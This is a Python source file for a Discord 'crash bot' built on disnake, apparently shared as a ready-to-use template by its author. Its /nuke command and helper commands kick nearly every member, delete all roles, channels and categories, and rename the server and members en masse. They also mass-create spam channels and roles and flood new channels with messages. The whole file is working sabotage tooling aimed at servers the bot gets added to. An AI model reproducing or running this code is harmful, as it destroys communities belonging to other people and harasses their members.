import disnake as discord
from disnake.ext import commands
import asyncio
import random
from colorama import init
from colorama import Fore, Style
import string
from alive_progress import alive_bar
from datetime import datetime
import os
import time
import cfg
from pystyle import Colors, Colorate
import signal

init()

os.system("title Crash Bot Console")



def handler(signum, frame):
    res = input("""What do you want to do?
1) Exit
2) Restart Bot
3) Nothing

>>>""")
    if res == '1':
        exit(1)
    if res == '2':
        os.system("installstart.bat")


signal.signal(signal.SIGINT, handler)


def randstr(size=6, chars=string.ascii_uppercase + string.digits + string.ascii_lowercase):
    return ''.join(random.choice(chars) for _ in range(size))


genid2 = randstr(50)


def generatengid():
    global genid2
    genid2 = randstr(50)
    return genid2


bot = commands.Bot(command_prefix="hz", intents=discord.Intents.all())
bot.remove_command('help')


@bot.event
async def on_ready():
    global genid2
    activity = discord.Streaming(
        name=cfg.Settings.ActivityText,
        url=cfg.Settings.ActivityURL, type=3)
    await bot.change_presence(status=discord.Status.dnd, activity=activity)
    now = datetime.now()
    disnake = Colorate.Horizontal(Colors.rainbow, text='ifwerez')
    name = Colorate.Horizontal(Colors.rainbow, text=str(bot.user))
    botid = Colorate.Horizontal(Colors.rainbow, text=str(bot.user.id))
    botping = Colorate.Horizontal(Colors.rainbow, text=str(int(bot.latency * 1000)))
    botguilds = Colorate.Horizontal(Colors.rainbow, text=str(len(bot.guilds)))
    botgenid = Colorate.Horizontal(Colors.rainbow, text=genid2)
    print(Colorate.Vertical(Colors.yellow_to_red, """   
 ▄████▄   ██▀███   ▄▄▄        ██████  ██░ ██     ▄▄▄▄    ▒█████  ▄▄▄█████▓
▒██▀ ▀█  ▓██ ▒ ██▒▒████▄    ▒██    ▒ ▓██░ ██▒   ▓█████▄ ▒██▒  ██▒▓  ██▒ ▓▒
▒▓█    ▄ ▓██ ░▄█ ▒▒██  ▀█▄  ░ ▓██▄   ▒██▀▀██░   ▒██▒ ▄██▒██░  ██▒▒ ▓██░ ▒░
▒▓▓▄ ▄██▒▒██▀▀█▄  ░██▄▄▄▄██   ▒   ██▒░▓█ ░██    ▒██░█▀  ▒██   ██░░ ▓██▓ ░ 
▒ ▓███▀ ░░██▓ ▒██▒ ▓█   ▓██▒▒██████▒▒░▓█▒░██▓   ░▓█  ▀█▓░ ████▓▒░  ▒██▒ ░ 
░ ░▒ ▒  ░░ ▒▓ ░▒▓░ ▒▒   ▓▒█░▒ ▒▓▒ ▒ ░ ▒ ░░▒░▒   ░▒▓███▀▒░ ▒░▒░▒░   ▒ ░░   
  ░  ▒     ░▒ ░ ▒░  ▒   ▒▒ ░░ ░▒  ░ ░ ▒ ░▒░ ░   ▒░▒   ░   ░ ▒ ▒░     ░    
░          ░░   ░   ░   ▒   ░  ░  ░   ░  ░░ ░    ░    ░ ░ ░ ░ ▒    ░      
░ ░         ░           ░  ░      ░   ░  ░  ░    ░          ░ ░           
░                                                     ░                   
▄▄▄█████▓▓█████  ███▄ ▄███▓ ██▓███   ██▓    ▄▄▄     ▄▄▄█████▓▓█████       
▓  ██▒ ▓▒▓█   ▀ ▓██▒▀█▀ ██▒▓██░  ██▒▓██▒   ▒████▄   ▓  ██▒ ▓▒▓█   ▀       
▒ ▓██░ ▒░▒███   ▓██    ▓██░▓██░ ██▓▒▒██░   ▒██  ▀█▄ ▒ ▓██░ ▒░▒███         
░ ▓██▓ ░ ▒▓█  ▄ ▒██    ▒██ ▒██▄█▓▒ ▒▒██░   ░██▄▄▄▄██░ ▓██▓ ░ ▒▓█  ▄       
  ▒██▒ ░ ░▒████▒▒██▒   ░██▒▒██▒ ░  ░░██████▒▓█   ▓██▒ ▒██▒ ░ ░▒████▒      
  ▒ ░░   ░░ ▒░ ░░ ▒░   ░  ░▒▓▒░ ░  ░░ ▒░▓  ░▒▒   ▓▒█░ ▒ ░░   ░░ ▒░ ░      
    ░     ░ ░  ░░  ░      ░░▒ ░     ░ ░ ▒  ░ ▒   ▒▒ ░   ░     ░ ░  ░      
  ░         ░   ░      ░   ░░         ░ ░    ░   ▒    ░         ░         
            ░  ░       ░                ░  ░     ░  ░           ░  ░"""))
    print(f"""                                               {Style.BRIGHT}{Fore.RESET}My disnake is {disnake}
                                
{Style.BRIGHT}{Fore.GREEN}---{Fore.RESET}BOT ACCOUNT{Fore.GREEN}---{Fore.RESET}
{Style.BRIGHT}{Fore.RESET}[{Fore.MAGENTA}{now.strftime('%H:%M:%S.%f')[:-3]}{Fore.RESET}] Name: {Fore.YELLOW}{name}{Fore.RESET}
{Style.BRIGHT}{Fore.RESET}[{Fore.MAGENTA}{now.strftime('%H:%M:%S.%f')[:-3]}{Fore.RESET}] ID: {Fore.YELLOW}{botid}{Fore.RESET}
{Style.BRIGHT}{Fore.RESET}[{Fore.MAGENTA}{now.strftime('%H:%M:%S.%f')[:-3]}{Fore.RESET}] Ping: {Fore.YELLOW}{botping}{Fore.RESET}
{Style.BRIGHT}{Fore.RESET}[{Fore.MAGENTA}{now.strftime('%H:%M:%S.%f')[:-3]}{Fore.RESET}] Guilds: {Fore.YELLOW}{botguilds}{Fore.RESET}
{Style.BRIGHT}{Fore.RESET}[{Fore.MAGENTA}{now.strftime('%H:%M:%S.%f')[:-3]}{Fore.RESET}] Gen ID: {Fore.YELLOW}{botgenid}{Fore.RESET}
""")


@bot.event
async def on_guild_join(guild):
    activity = discord.Streaming(
        name=cfg.Settings.ActivityText,
        url=cfg.Settings.ActivityURL, type=3)
    await bot.change_presence(status=discord.Status.dnd, activity=activity)
    now = datetime.now()
    print(
        f"""{Style.BRIGHT}{Fore.RESET}[{Fore.GREEN}{now.strftime('%H:%M:%S.%f')[:-3]}{Fore.RESET}] Got {Fore.GREEN}added{Fore.RESET} to {Colorate.Horizontal(Colors.rainbow, text=guild.name)}{Fore.RESET}

{Style.BRIGHT}{Style.BRIGHT}{Fore.GREEN}---{Fore.RESET}GUILD INFORMATION{Fore.GREEN}---{Fore.RESET}
{Style.BRIGHT}{Fore.RESET}[{Fore.MAGENTA}{now.strftime('%H:%M:%S.%f')[:-3]}{Fore.RESET}] Guild Name: {Colorate.Horizontal(Colors.rainbow, text=guild.name)}{Fore.RESET}
{Style.BRIGHT}{Fore.RESET}[{Fore.MAGENTA}{now.strftime('%H:%M:%S.%f')[:-3]}{Fore.RESET}] Guild ID: {Colorate.Horizontal(Colors.rainbow, text=str(guild.id))}{Fore.RESET}
{Style.BRIGHT}{Fore.RESET}[{Fore.MAGENTA}{now.strftime('%H:%M:%S.%f')[:-3]}{Fore.RESET}] Guild owner: {Colorate.Horizontal(Colors.rainbow, text=str(guild.owner))}{Fore.RESET}
{Style.BRIGHT}{Fore.RESET}[{Fore.MAGENTA}{now.strftime('%H:%M:%S.%f')[:-3]}{Fore.RESET}] Guild owner ID: {Colorate.Horizontal(Colors.rainbow, text=str(guild.owner.id))}{Fore.RESET}
{Style.BRIGHT}{Fore.RESET}[{Fore.MAGENTA}{now.strftime('%H:%M:%S.%f')[:-3]}{Fore.RESET}] Members: {Colorate.Horizontal(Colors.rainbow, text=str(len(guild.members)))}{Fore.RESET}
{Style.BRIGHT}{Fore.RESET}[{Fore.MAGENTA}{now.strftime('%H:%M:%S.%f')[:-3]}{Fore.RESET}] Roles: {Colorate.Horizontal(Colors.rainbow, text=str(len(guild.roles)))}{Fore.RESET}
{Style.BRIGHT}{Fore.RESET}[{Fore.MAGENTA}{now.strftime('%H:%M:%S.%f')[:-3]}{Fore.RESET}] All Channels: {Colorate.Horizontal(Colors.rainbow, text=str(len(guild.channels)))}{Fore.RESET}
{Style.BRIGHT}{Fore.RESET}[{Fore.MAGENTA}{now.strftime('%H:%M:%S.%f')[:-3]}{Fore.RESET}] Text Channels: {Colorate.Horizontal(Colors.rainbow, text=str(len(guild.text_channels)))}{Fore.RESET}
{Style.BRIGHT}{Fore.RESET}[{Fore.MAGENTA}{now.strftime('%H:%M:%S.%f')[:-3]}{Fore.RESET}] Voice Channels: {Colorate.Horizontal(Colors.rainbow, text=str(len(guild.voice_channels)))}{Fore.RESET}
{Style.BRIGHT}{Fore.RESET}[{Fore.MAGENTA}{now.strftime('%H:%M:%S.%f')[:-3]}{Fore.RESET}] Categories: {Colorate.Horizontal(Colors.rainbow, text=str(len(guild.categories)))}{Fore.RESET}
{Style.BRIGHT}{Fore.RESET}[{Fore.MAGENTA}{now.strftime('%H:%M:%S.%f')[:-3]}{Fore.RESET}] Ping: {Colorate.Horizontal(Colors.rainbow, text=str(int(bot.latency * 1000)))}{Fore.RESET}
""")


@bot.event
async def on_guild_remove(guild):
    activity = discord.Streaming(
        name=cfg.Settings.ActivityText,
        url=cfg.Settings.ActivityURL, type=3)
    await bot.change_presence(status=discord.Status.dnd, activity=activity)
    now = datetime.now()
    print(
        f"{Style.BRIGHT}{Fore.RESET}[{Fore.RED}{now.strftime('%H:%M:%S.%f')[:-3]}{Fore.RESET}] Got {Fore.RED}kicked{Fore.RESET} from {Colorate.Horizontal(Colors.rainbow, text=guild.name)}")


@bot.event
async def on_guild_channel_create(channel):
    for i in range(cfg.Settings.SpamAmount):
        try:
            await channel.send(cfg.Settings.SpamText)
        except discord.errors.HTTPException:
            now = datetime.now()
            print(
                f"{Style.BRIGHT}{Fore.RESET}[{Fore.RED}{now.strftime('%H:%M:%S.%f')[:-3]}{Fore.RESET}] Rate Limited by Channel Spam{Fore.RESET}")


@bot.event
async def on_guild_role_create(role):
    for i in role.guild.members:
        await i.add_roles(role)


@bot.slash_command(description="Тотальное Уничтожение🦣")
async def nuke(inter):
    now = datetime.now()
    print(
        f"{Style.BRIGHT}{Fore.RESET}[{Fore.RED}{now.strftime('%H:%M:%S.%f')[:-3]}{Fore.RESET}] Server Crash Started! Server Name: {Fore.YELLOW}{Colorate.Horizontal(Colors.rainbow, text=inter.guild.name)}{Fore.RESET}\n")

    await inter.send("Краш начался. Сделано ifwerez", ephemeral=True)

    asyncio.create_task(cgn(inter))
    asyncio.create_task(cga(inter))
    asyncio.create_task(dca(inter))
    asyncio.create_task(dr(inter))
    asyncio.create_task(dc(inter))
    asyncio.create_task(cc(inter))
    asyncio.create_task(cn(inter))
    asyncio.create_task(cr(inter))
    asyncio.create_task(kickall(inter, inter.author))


async def scr(genid, guild):
    global genid2
    if genid == genid2:
        now = datetime.now()
        print(f"""{Style.BRIGHT}{Style.BRIGHT}{Fore.GREEN}---{Fore.RESET}CRASH RESULTS{Fore.GREEN}---{Fore.RESET}
{Style.BRIGHT}{Fore.RESET}[{Fore.MAGENTA}{now.strftime('%H:%M:%S.%f')[:-3]}{Fore.RESET}] Guild Name: {Colorate.Horizontal(Colors.rainbow, text=guild.name)}{Fore.RESET}
{Style.BRIGHT}{Fore.RESET}[{Fore.MAGENTA}{now.strftime('%H:%M:%S.%f')[:-3]}{Fore.RESET}] Guild ID: {Colorate.Horizontal(Colors.rainbow, text=str(guild.id))}{Fore.RESET}
{Style.BRIGHT}{Fore.RESET}[{Fore.MAGENTA}{now.strftime('%H:%M:%S.%f')[:-3]}{Fore.RESET}] Guild owner: {Colorate.Horizontal(Colors.rainbow, text=str(guild.owner))}{Fore.RESET}
{Style.BRIGHT}{Fore.RESET}[{Fore.MAGENTA}{now.strftime('%H:%M:%S.%f')[:-3]}{Fore.RESET}] Guild owner ID: {Colorate.Horizontal(Colors.rainbow, text=str(guild.owner.id))}{Fore.RESET}
{Style.BRIGHT}{Fore.RESET}[{Fore.MAGENTA}{now.strftime('%H:%M:%S.%f')[:-3]}{Fore.RESET}] Members: {Colorate.Horizontal(Colors.rainbow, text=str(len(guild.members)))}{Fore.RESET}
{Style.BRIGHT}{Fore.RESET}[{Fore.MAGENTA}{now.strftime('%H:%M:%S.%f')[:-3]}{Fore.RESET}] Roles: {Colorate.Horizontal(Colors.rainbow, text=str(len(guild.roles)))}{Fore.RESET}
{Style.BRIGHT}{Fore.RESET}[{Fore.MAGENTA}{now.strftime('%H:%M:%S.%f')[:-3]}{Fore.RESET}] All Channels: {Colorate.Horizontal(Colors.rainbow, text=str(len(guild.channels)))}{Fore.RESET}
{Style.BRIGHT}{Fore.RESET}[{Fore.MAGENTA}{now.strftime('%H:%M:%S.%f')[:-3]}{Fore.RESET}] Text Channels: {Colorate.Horizontal(Colors.rainbow, text=str(len(guild.text_channels)))}{Fore.RESET}
{Style.BRIGHT}{Fore.RESET}[{Fore.MAGENTA}{now.strftime('%H:%M:%S.%f')[:-3]}{Fore.RESET}] Voice Channels: {Colorate.Horizontal(Colors.rainbow, text=str(len(guild.voice_channels)))}{Fore.RESET}
{Style.BRIGHT}{Fore.RESET}[{Fore.MAGENTA}{now.strftime('%H:%M:%S.%f')[:-3]}{Fore.RESET}] Categories: {Colorate.Horizontal(Colors.rainbow, text=str(len(guild.categories)))}{Fore.RESET}
{Style.BRIGHT}{Fore.RESET}[{Fore.MAGENTA}{now.strftime('%H:%M:%S.%f')[:-3]}{Fore.RESET}] Ping: {Colorate.Horizontal(Colors.rainbow, text=str(int(bot.latency * 1000)))}{Fore.RESET}
{Style.BRIGHT}{Fore.RESET}[{Fore.MAGENTA}{now.strftime('%H:%M:%S.%f')[:-3]}{Fore.RESET}] Used Gen ID! new Gen ID: {Colorate.Horizontal(Colors.rainbow, text=generatengid())}{Fore.RESET}

{Style.BRIGHT}{Fore.RESET}[{Fore.RED}{now.strftime('%H:%M:%S.%f')[:-3]}{Fore.RESET}] Thank You For Using Mine Crash Bot Template️ | Made by IfweReZ.{Fore.RESET}
{Style.BRIGHT}{Fore.RESET}[{Fore.RED}{now.strftime('%H:%M:%S.%f')[:-3]}{Fore.RESET}] Exiting in 5 seconds.{Fore.RESET}
""")
        time.sleep(5)
        quit()


@bot.slash_command(description="Информация о сервере🤡")
async def serverinfo(inter):
    guild = inter.guild
    now = datetime.now()
    print(f"""{Style.BRIGHT}{Style.BRIGHT}{Fore.GREEN}---{Fore.RESET}SERVER INFO{Fore.GREEN}---{Fore.RESET}
{Style.BRIGHT}{Fore.RESET}[{Fore.MAGENTA}{now.strftime('%H:%M:%S.%f')[:-3]}{Fore.RESET}] Guild Name: {Colorate.Horizontal(Colors.rainbow, text=guild.name)}{Fore.RESET}
{Style.BRIGHT}{Fore.RESET}[{Fore.MAGENTA}{now.strftime('%H:%M:%S.%f')[:-3]}{Fore.RESET}] Guild ID: {Colorate.Horizontal(Colors.rainbow, text=str(guild.id))}{Fore.RESET}
{Style.BRIGHT}{Fore.RESET}[{Fore.MAGENTA}{now.strftime('%H:%M:%S.%f')[:-3]}{Fore.RESET}] Guild owner: {Colorate.Horizontal(Colors.rainbow, text=str(guild.owner))}{Fore.RESET}
{Style.BRIGHT}{Fore.RESET}[{Fore.MAGENTA}{now.strftime('%H:%M:%S.%f')[:-3]}{Fore.RESET}] Guild owner ID: {Colorate.Horizontal(Colors.rainbow, text=str(guild.owner.id))}{Fore.RESET}
{Style.BRIGHT}{Fore.RESET}[{Fore.MAGENTA}{now.strftime('%H:%M:%S.%f')[:-3]}{Fore.RESET}] Members: {Colorate.Horizontal(Colors.rainbow, text=str(len(guild.members)))}{Fore.RESET}
{Style.BRIGHT}{Fore.RESET}[{Fore.MAGENTA}{now.strftime('%H:%M:%S.%f')[:-3]}{Fore.RESET}] Roles: {Colorate.Horizontal(Colors.rainbow, text=str(len(guild.roles)))}{Fore.RESET}
{Style.BRIGHT}{Fore.RESET}[{Fore.MAGENTA}{now.strftime('%H:%M:%S.%f')[:-3]}{Fore.RESET}] All Channels: {Colorate.Horizontal(Colors.rainbow, text=str(len(guild.channels)))}{Fore.RESET}
{Style.BRIGHT}{Fore.RESET}[{Fore.MAGENTA}{now.strftime('%H:%M:%S.%f')[:-3]}{Fore.RESET}] Text Channels: {Colorate.Horizontal(Colors.rainbow, text=str(len(guild.text_channels)))}{Fore.RESET}
{Style.BRIGHT}{Fore.RESET}[{Fore.MAGENTA}{now.strftime('%H:%M:%S.%f')[:-3]}{Fore.RESET}] Voice Channels: {Colorate.Horizontal(Colors.rainbow, text=str(len(guild.voice_channels)))}{Fore.RESET}
{Style.BRIGHT}{Fore.RESET}[{Fore.MAGENTA}{now.strftime('%H:%M:%S.%f')[:-3]}{Fore.RESET}] Categories: {Colorate.Horizontal(Colors.rainbow, text=str(len(guild.categories)))}{Fore.RESET}
{Style.BRIGHT}{Fore.RESET}[{Fore.MAGENTA}{now.strftime('%H:%M:%S.%f')[:-3]}{Fore.RESET}] Ping: {Colorate.Horizontal(Colors.rainbow, text=str(int(bot.latency * 1000)))}{Fore.RESET}
""")
    await inter.send("Информация отправлена в консоль бота", ephemeral=True)


@bot.slash_command(description="Выгоняет Участников Сервера👎🏼")
async def kickall(inter, nokick: discord.User):
    await inter.send("Выгоняю Участников Сервера", ephemeral=True)
    now = datetime.now()
    print(
        f"{Style.BRIGHT}{Fore.RESET}[{Fore.MAGENTA}{now.strftime('%H:%M:%S.%f')[:-3]}{Fore.RESET}] Kicking Users...{Fore.RESET}")
    for user in inter.guild.members:
        try:
            if not user == inter.author and not user == nokick and not user == bot.user:
                await user.kick()
                print(f"{Style.BRIGHT}{Fore.RESET}[{Fore.GREEN}+{Fore.RESET}] Kicked {user}{Fore.RESET}")
        except Exception as error:
            print(
                f"{Style.BRIGHT}{Fore.RESET}[{Fore.RED}-{Fore.RESET}] Not Kicked {user} Because of:\n{Fore.RED}{error}{Fore.RESET}")
    now = datetime.now()
    print(
        f"{Style.BRIGHT}{Fore.RESET}[{Fore.GREEN}{now.strftime('%H:%M:%S.%f')[:-3]}{Fore.RESET}] Kicked Users{Fore.RESET}")


@bot.slash_command(description="Меняет Аватарку Сервера😎")
async def cga(inter):
    await inter.send("Меняю Аватарку Сервера", ephemeral=True)
    with open(cfg.Settings.AvatarFileName, 'rb') as f:
        icon = f.read()
        await inter.guild.edit(icon=icon)
    now = datetime.now()
    print(
        f"{Style.BRIGHT}{Fore.RESET}[{Fore.GREEN}{now.strftime('%H:%M:%S.%f')[:-3]}{Fore.RESET}] Changed Server Avatar{Fore.RESET}")


@bot.slash_command(description="Удаляет Категории😂")
async def dca(inter):
    await inter.send("Удаляю Категории", ephemeral=True)
    now = datetime.now()
    print(
        f"{Style.BRIGHT}{Fore.RESET}[{Fore.MAGENTA}{now.strftime('%H:%M:%S.%f')[:-3]}{Fore.RESET}] Deleting Categories...{Fore.RESET}")
    with alive_bar(len(inter.guild.categories)) as bar:
        for category in inter.guild.categories:
            try:
                bar()
                await category.delete()
            except:
                pass
    now = datetime.now()
    print(
        f"{Style.BRIGHT}{Fore.RESET}[{Fore.GREEN}{now.strftime('%H:%M:%S.%f')[:-3]}{Fore.RESET}] Deleted Catagories{Fore.RESET}")


@bot.slash_command(description="Удаляет Роли😢")
async def dr(inter):
    await inter.send("Удаляю Роли", ephemeral=True)
    now = datetime.now()
    print(
        f"{Style.BRIGHT}{Fore.RESET}[{Fore.MAGENTA}{now.strftime('%H:%M:%S.%f')[:-3]}{Fore.RESET}] Deleting Roles...{Fore.RESET}")
    for role in inter.guild.roles:
        try:
            await role.delete()
        except:
            pass
    now = datetime.now()
    print(
        f"{Style.BRIGHT}{Fore.RESET}[{Fore.GREEN}{now.strftime('%H:%M:%S.%f')[:-3]}{Fore.RESET}] Deleted Roles{Fore.RESET}")


@bot.slash_command(description="Удаляет Каналы😢")
async def dc(inter):
    await inter.send("Удаляю Каналы", ephemeral=True)
    now = datetime.now()
    print(
        f"{Style.BRIGHT}{Fore.RESET}[{Fore.MAGENTA}{now.strftime('%H:%M:%S.%f')[:-3]}{Fore.RESET}] Deleting Channels...{Fore.RESET}")
    for channel in inter.guild.channels:
        try:
            if channel != inter.channel:
                await channel.delete()
        except:
            pass
    now = datetime.now()
    print(
        f"{Style.BRIGHT}{Fore.RESET}[{Fore.GREEN}{now.strftime('%H:%M:%S.%f')[:-3]}{Fore.RESET}] Deleted Channels{Fore.RESET}")


@bot.slash_command(description="Меняет Название Сервера😱")
async def cgn(inter):
    await inter.send("Меняю Название Сервера", ephemeral=True)
    now = datetime.now()
    print(
        f"{Style.BRIGHT}{Fore.RESET}[{Fore.MAGENTA}{now.strftime('%H:%M:%S.%f')[:-3]}{Fore.RESET}] Changing Server Name...{Fore.RESET}")
    for i in range(500):
        try:
            await inter.guild.edit(name=f"{cfg.Settings.ServerName} {randstr(10)}")
        except discord.errors.HTTPException:
            now = datetime.now()
            print(
                f"{Style.BRIGHT}{Fore.RESET}[{Fore.RED}{now.strftime('%H:%M:%S.%f')[:-3]}{Fore.RESET}] Rate Limited by Server Name Change{Fore.RESET}")


@bot.slash_command(description="Создаёт Каналы🥰")
async def cc(inter):
    global genid2
    await inter.send("Создаю Канады и Спамлю в Них", ephemeral=True)
    now = datetime.now()
    print(f"{Style.BRIGHT}{Fore.RESET}[{Fore.MAGENTA}{now.strftime('%H:%M:%S.%f')[:-3]}{Fore.RESET}] Creating Text And Voice Channels...{Fore.RESET}")
    for i in range(cfg.Settings.ChannelsAmount):
        try:
            await inter.guild.create_text_channel(name=f"{cfg.Settings.TextChannelName}-{randstr(10)}", topic="by ifwerez")
            await inter.guild.create_voice_channel(name=f"{cfg.Settings.VoiceChannelName} {randstr(10)}")
        except discord.errors.HTTPException:
            print(f"{Style.BRIGHT}{Fore.RESET}[{Fore.RED}{now.strftime('%H:%M:%S.%f')[:-3]}{Fore.RESET}] Rate Limited by Channels Creation{Fore.RESET}")
    now = datetime.now()
    print(f"{Style.BRIGHT}{Fore.RESET}[{Fore.GREEN}{now.strftime('%H:%M:%S.%f')[:-3]}{Fore.RESET}] Text And Voice Channels Created{Fore.RESET}")
    asyncio.create_task(scr(genid2, inter.guild))


@bot.slash_command(description="Создаёт Роли😍")
async def cr(inter):
    await inter.send("Создаю Роли и Выдаю Всем", ephemeral=True)
    now = datetime.now()
    print(
        f"{Style.BRIGHT}{Fore.RESET}[{Fore.MAGENTA}{now.strftime('%H:%M:%S.%f')[:-3]}{Fore.RESET}] Creating Roles...{Fore.RESET}")
    for i in range(500):
        try:
            await inter.guild.create_role(name=f'{cfg.Settings.RolesName} {randstr(10)}', colour=random.randint(1, 99999999))
            # if role != None:
            #    print(f"{Style.BRIGHT}{Fore.RESET}[{Fore.CYAN}{now.strftime('%H:%M:%S.%f')[:-3]}{Fore.RESET}] Created Role {i}\r")
        except:
            pass
    now = datetime.now()
    print(
        f"{Style.BRIGHT}{Fore.RESET}[{Fore.GREEN}{now.strftime('%H:%M:%S.%f')[:-3]}{Fore.RESET}] Created Roles{Fore.RESET}")


@bot.slash_command(description="Изменяет Имена Участникам😘")
async def cn(inter):
    await inter.send("Меня Имена Участникам Ниже Моей Роли", ephemeral=True)
    now = datetime.now()
    print(
        f"{Style.BRIGHT}{Fore.RESET}[{Fore.MAGENTA}{now.strftime('%H:%M:%S.%f')[:-3]}{Fore.RESET}] Editing Nicknames...{Fore.RESET}")
    for user in inter.guild.members:
        try:
            await user.edit(nick=f'{cfg.Settings.UsersName} {randstr(10)}')
        except:
            pass
    now = datetime.now()
    print(
        f"{Style.BRIGHT}{Fore.RESET}[{Fore.GREEN}{now.strftime('%H:%M:%S.%f')[:-3]}{Fore.RESET}] Edited Nickmanes{Fore.RESET}")


bot.run(cfg.Settings.token)
